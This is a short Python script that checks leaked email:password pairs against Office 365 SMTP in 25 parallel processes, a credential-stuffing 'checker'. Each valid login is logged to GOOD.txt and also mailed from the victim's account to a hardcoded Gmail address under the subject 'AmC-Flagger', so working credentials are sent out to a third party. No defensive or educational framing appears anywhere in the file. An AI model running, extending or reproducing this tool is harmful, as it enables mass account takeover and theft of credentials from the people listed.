import smtplib
import datetime
from multiprocessing import Pool
def work(user,pwd):
    print("LIVE => "+user+":"+pwd+"")
    f = open("GOOD.txt", "a+")
    f.write("LIVE => "+user+":"+pwd+"\n")

def bad(user,pwd):
    print("BAD => "+user+":"+pwd+"")
    f = open("BAD.txt", "a+")
    f.write("BAD => "+user+":"+pwd+"\n")













def checker(data):
    try:
     data = data.split(":")
     user = data[0]
     pwd = data[1]
     mailserver = smtplib.SMTP('smtp.office365.com', 587)
     mailserver.ehlo()
     mailserver.starttls()
     mailserver.login(user, pwd)
     subj = "AmC-Flagger"
     date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
     from_addr = user
     to_addr = "weekj9585@gmail.com"
     message_text = "" , user , "|" , pwd , ""
     msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (from_addr, to_addr, subj, date, message_text)
     mailserver.sendmail(from_addr, to_addr, msg)
     mailserver.quit()
     work(user,pwd)
    except:
        bad(user,pwd)



if __name__ =="__main__":
  file_name = raw_input("Enter Your Liste Email Name :")
  try:
    TEXTList = open(file_name, 'r').read().splitlines()
    p = Pool(25)
    p.map(checker, TEXTList)
  except:
    print("failed to make process")
    pass